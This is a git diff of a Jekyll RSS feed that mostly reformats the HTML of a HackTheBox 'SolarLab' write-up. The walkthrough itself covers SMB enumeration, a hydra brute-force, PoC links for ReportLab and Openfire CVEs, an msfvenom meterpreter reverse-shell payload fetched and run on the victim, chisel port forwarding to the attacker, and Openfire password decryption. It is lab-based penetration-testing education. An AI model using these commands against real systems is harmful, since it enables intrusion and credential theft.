@@ -5,8 +5,8 @@
     <description>SecOps and HTB Write Ups</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 24 Sep 2024 17:41:28 -0400</pubDate>
-    <lastBuildDate>Tue, 24 Sep 2024 17:41:28 -0400</lastBuildDate>
+    <pubDate>Wed, 25 Sep 2024 11:58:22 -0400</pubDate>
+    <lastBuildDate>Wed, 25 Sep 2024 11:58:22 -0400</lastBuildDate>
     <generator>Jekyll v4.3.3</generator>
     
       <item>
@@ -101,26 +101,18 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
 &lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_SMB_Shares_Connect.png&quot; /&gt;&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;We have another directory:
-    &lt;ul&gt;
-      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;concepts&lt;/code&gt;&lt;/li&gt;
-    &lt;/ul&gt;
+  &lt;li&gt;We have another directory:&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;concepts&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Also we have some files we can exfil:&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;details-file.xlsx&lt;/code&gt;&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;old_leave_request_form.docx&lt;/code&gt;&lt;/p&gt;
   &lt;/li&gt;
-  &lt;li&gt;Also we have some files we can exfil:
-    &lt;ul&gt;
-      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;details-file.xlsx&lt;/code&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;old_leave_request_form.docx&lt;/code&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Change directories to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;concepts&lt;/code&gt; and we see 2 more files:
-    &lt;ul&gt;
-      &lt;li&gt;
-        &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Training-Request-Form.docx&lt;/code&gt;&lt;/p&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Travel-Request-Sample.docx&lt;/code&gt;&lt;/p&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Change directories to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;concepts&lt;/code&gt; and we see 2 more files:&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Training-Request-Form.docx&lt;/code&gt;&lt;br /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Travel-Request-Sample.docx&lt;/code&gt;&lt;/p&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
 
@@ -148,19 +140,16 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netexec smb 10.129.19.24 -u &apos;anonymous&apos; -p &apos;&apos; --rid-brute
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_SMB_RIDBrute.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_SMB_RIDBrute.png&quot; class=&quot;resize2&quot; /&gt;&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;We can see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blake&lt;/code&gt; is indeed a user that has access to the share. Using the Password dumped form the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xlsx&lt;/code&gt; sheet we can indeed access the share using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blake&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&quot;hydra&quot;&gt;Hydra:&lt;/h2&gt;
 &lt;ul&gt;
-  &lt;li&gt;Export the username and passwords from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xlsx&lt;/code&gt; too (2) text files so we can use them in some brute forcing attempts.
-    &lt;ul&gt;
-      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userSolarLabs.txt&lt;/code&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwordsSolarLabs.txt&lt;/code&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
+  &lt;li&gt;Export the username and passwords from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xlsx&lt;/code&gt; too (2) text files so we can use them in some brute forcing attempts.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userSolarLabs.txt&lt;/code&gt;&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwordsSolarLabs.txt&lt;/code&gt;&lt;/li&gt;
   &lt;li&gt;Next lets run these lists against the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;report.solarlab.htb&lt;/code&gt; page with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra&lt;/code&gt; and see if we get valid user hits.&lt;/li&gt;
 &lt;/ul&gt;
 
@@ -171,15 +160,12 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
   &lt;li&gt;We do get some valid user returns.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_Hydra_Users.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_Hydra_Users.png&quot; class=&quot;resize2&quot; /&gt;&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;We can see a pattern with these names. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Firstname,LastLetterofName&lt;/code&gt;. We dont see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blake&lt;/code&gt; in this list. Because in our list his name doesn’t include his last name letter.&lt;/li&gt;
-  &lt;li&gt;Change our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-L&lt;/code&gt; parameter in our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra command&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-l BlakeB&lt;/code&gt; and see if we return a valid login.
-    &lt;ul&gt;
-      &lt;li&gt;NOTICE: its a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lowercase -l instead of -L when doing a direct user and not a list&lt;/code&gt;.&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
+  &lt;li&gt;Change our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-L&lt;/code&gt; parameter in our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra command&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-l BlakeB&lt;/code&gt; and see if we return a valid login.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-triangle-exclamation fa-xl&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; &lt;b&gt;NOTICE:&lt;/b&gt; its a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lowercase -l instead of -L when doing a direct user and not a list&lt;/code&gt;.&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -l BlakeB -P passwordsSolarlab.txt report.solarlab.htb -s 6791 http-post-form &quot;/login:username=^USER^&amp;amp;password=^PASS^&amp;amp;enter=Login:User not found.&quot; -V
@@ -190,29 +176,27 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
   &lt;li&gt;We get some hits.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_Hydra_BlakeB.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_Hydra_BlakeB.png&quot; class=&quot;resize2&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;reports-login&quot;&gt;Reports Login:&lt;/h2&gt;
 &lt;ul&gt;
   &lt;li&gt;Now we have a valid login lets login to the webpage at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;report.solarlab.htb:6791&lt;/code&gt;.&lt;/li&gt;
-  &lt;li&gt;We manage to login with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BlakeB&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ThisCanB3typedeasily1@&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;We manage to login with &lt;strong&gt;USER:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BlakeB&lt;/code&gt; &lt;strong&gt;PASSWORD:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ThisCanB3typedeasily1@&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_Report_Login.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_Report_Login.png&quot; class=&quot;resize&quot; /&gt;&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Each of these options on this page seems to generate a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pdf&lt;/code&gt; file.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_Report_PDF_Example.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_Report_PDF_Example.png&quot; class=&quot;resize&quot; /&gt;&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Googling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reportlab pdf cve&lt;/code&gt; we actually get a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE&lt;/code&gt; related to this functionality.
-    &lt;h2 id=&quot;cve-202333733&quot;&gt;CVE-2023–33733:&lt;/h2&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;POC&lt;/strong&gt;: https://github.com/c53elyas/CVE-2023-33733&lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;CVE&lt;/strong&gt;: https://nvd.nist.gov/vuln/detail/CVE-2023-33733&lt;/p&gt;
+    &lt;h2 id=&quot;cve-202333733&quot;&gt;CVE-2023–33733:&lt;br /&gt;&lt;/h2&gt;
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://github.com/c53elyas/CVE-2023-33733&quot;&gt;&lt;strong&gt;POC&lt;/strong&gt;: https://github.com/c53elyas/CVE-2023-33733&lt;/a&gt;&lt;br /&gt;
+&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-33733&quot;&gt; &lt;strong&gt;CVE&lt;/strong&gt;: https://nvd.nist.gov/vuln/detail/CVE-2023-33733 &lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;Reading ahead this appears to be our foothold path. We should be able to perform code execution with this PoC.&lt;/li&gt;
 &lt;/ul&gt;
@@ -248,13 +232,10 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-triangle-exclamation fa-xl&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; &lt;b&gt;NOTICE:&lt;/b&gt; The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POC&lt;/code&gt; has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;PARA&amp;gt;&lt;/code&gt; in the exploit. I had to change those flags to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;p&amp;gt; &amp;lt;/p&amp;gt;&lt;/code&gt; in order for the exploit to work. I don’t understand why but if you have issues in processing the exploit then try that.&lt;/p&gt;
+
 &lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;NOTICE:&lt;/strong&gt; The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POC&lt;/code&gt; has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;PARA&amp;gt;&lt;/code&gt; in the exploit. I had to change those flags to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;p&amp;gt; &amp;lt;/p&amp;gt;&lt;/code&gt; in order for the exploit to work. I don’t understand why but if you have issues in processing the exploit then try that.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;We successfully land on the victim as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blake&lt;/code&gt;.&lt;/p&gt;
-  &lt;/li&gt;
+  &lt;li&gt;We successfully land on the victim as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blake&lt;/code&gt;.&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_Blake_Foothold.png&quot; /&gt;&lt;/p&gt;
@@ -274,23 +255,21 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
 
 &lt;ul&gt;
   &lt;li&gt;Lets download this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users.db&lt;/code&gt; file and explore it.&lt;/li&gt;
-  &lt;li&gt;I switched over to a meterpreter session for easier exfil.
-    &lt;ul&gt;
-      &lt;li&gt;Make a msfvenom payload:&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
+  &lt;li&gt;I switched over to a meterpreter session for easier exfil.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; Make a msfvenom payload:&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f exe LHOST=10.10.14.x LPORT=37347 &amp;gt; shell.exe
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Make a directory on the victim under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&lt;/code&gt; then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; your payload to the victim and run it.
-    &lt;ul&gt;
-      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir temp&lt;/code&gt;&lt;/li&gt;
-    &lt;/ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Make a directory on the victim under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&lt;/code&gt; then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; your payload to the victim and run it.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir temp&lt;/code&gt;&lt;/p&gt;
   &lt;/li&gt;
-  &lt;li&gt;Now we can just use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;download&lt;/code&gt; function of meterpreter and get the file.&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Now we can just use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;download&lt;/code&gt; function of meterpreter and get the file.&lt;/p&gt;
+  &lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_Usersdb_Exfil.png&quot; /&gt;&lt;/p&gt;
@@ -329,11 +308,8 @@ sqlite&amp;gt; select * from user;
 
 &lt;h2 id=&quot;openfire&quot;&gt;OpenFire:&lt;/h2&gt;
 &lt;ul&gt;
-  &lt;li&gt;Looking around in program files we see an interesting app.
-    &lt;ul&gt;
-      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenFire&lt;/code&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
+  &lt;li&gt;Looking around in program files we see an interesting app.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenFire&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/box-images/SolarLab/SolarLab_OpenFire_Discovery.png&quot; /&gt;&lt;/p&gt;
@@ -407,11 +383,8 @@ sqlite&amp;gt; select * from user;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Next, on the victim lets run the following command in our meterpreter session to create a background process to keep this ports open and forwarded.
-    &lt;ul&gt;
-      &lt;li&gt;Make sure to change the ip address to match your box.&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
+  &lt;li&gt;Next, on the victim lets run the following command in our meterpreter session to create a background process to keep this ports open and forwarded.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; Make sure to change the ip address to match your box.&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;execute -f C:\\temp\\chisel.exe -a &quot;client 10.10.14.70:37373 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091&quot;
@@ -433,26 +406,21 @@ sqlite&amp;gt; select * from user;
 &lt;ul&gt;
   &lt;li&gt;Attempting some basic user/password combos is unsuccessful.&lt;/li&gt;
   &lt;li&gt;Attempting to use the passwords and accounts found earlier in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.db&lt;/code&gt; doesn’t seem to work either.&lt;/li&gt;
-  &lt;li&gt;The only thing we have going for us now is that we can see what version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openfire&lt;/code&gt; is running
-    &lt;ul&gt;
-      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Openfire, Version: 4.7.4&lt;/code&gt;&lt;/li&gt;
-    &lt;/ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;The only thing we have going for us now is that we can see what version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openfire&lt;/code&gt; is running&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Openfire, Version: 4.7.4&lt;/code&gt;&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;Maybe there’s a CVE related to this version.&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&quot;cve-2023-32315&quot;&gt;CVE-2023-32315:&lt;/h2&gt;
 &lt;ul&gt;
-  &lt;li&gt;We find a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCE LOGIN BYPASS&lt;/code&gt; cve for this version of openfire.
-    &lt;ul&gt;
-      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2023-32315&lt;/code&gt;&lt;/li&gt;
-      &lt;li&gt;https://nvd.nist.gov/vuln/detail/CVE-2023-32315&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;There is also a POC for this cve.
-    &lt;ul&gt;
-      &lt;li&gt;https://github.com/miko550/CVE-2023-32315&lt;/li&gt;
-    &lt;/ul&gt;
+  &lt;li&gt;We find a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCE LOGIN BYPASS&lt;/code&gt; cve for this version of openfire.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2023-32315&lt;/code&gt;&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-32315&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2023-32315&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;There is also a POC for this cve.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://github.com/miko550/CVE-2023-32315&quot;&gt;https://github.com/miko550/CVE-2023-32315&lt;/a&gt;&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;&lt;strong&gt;Explanation:&lt;/strong&gt; Openfire’s administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users.&lt;/p&gt;
@@ -522,8 +490,9 @@ sqlite&amp;gt; select * from user;
   &lt;li&gt;It turns out this hash is uncommon and not in hashcat.&lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;Looking around github though we find a java tool that someone made to decrypt openfire hashes.&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://github.com/c0rdis/openfire_decrypt&quot;&gt;https://github.com/c0rdis/openfire_decrypt&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
   &lt;/li&gt;
-  &lt;li&gt;https://github.com/c0rdis/openfire_decrypt&lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;Clone this tool over to your attack box and lets see if we can decrypt it now.&lt;/p&gt;
   &lt;/li&gt;
@@ -557,9 +526,7 @@ sqlite&amp;gt; select * from user;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java OpenfireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;NOTICE:&lt;/strong&gt; I had issues of the java program not finding the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;class&lt;/code&gt; which was located in the same folder where I cloned from github. If you have this issue just run the command like this instead.&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-triangle-exclamation fa-xl&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; &lt;b&gt;NOTICE:&lt;/b&gt; I had issues of the java program not finding the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;class&lt;/code&gt; which was located in the same folder where I cloned from github. If you have this issue just run the command like this instead.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java -cp . OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
